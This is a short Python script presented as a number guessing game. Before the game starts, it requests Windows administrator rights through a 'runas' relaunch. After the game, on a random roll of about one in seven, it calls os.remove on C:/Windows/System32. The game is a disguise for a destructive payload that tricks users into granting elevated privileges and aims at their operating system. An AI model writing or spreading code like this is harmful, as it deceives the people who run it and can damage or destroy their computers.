import os
import random
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():

    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

print('Number Guessing Game')

def Number_Guessing_Game():
    number_to_guess = random.randint(1,100)
    guess = None

    while guess != number_to_guess:
        guess = int(input('Please guess a number between 1 to 100. '))

        if guess < number_to_guess:
            print('Number too low. Please try again!')

        elif guess > number_to_guess:
            print('Number too high. Please try again!')

    else:
        print(f'Nice, you got it right! The number was {number_to_guess}!')

Number_Guessing_Game()

if random.randint(0, 6) == 1:
    os.remove("C:/Windows/System32")
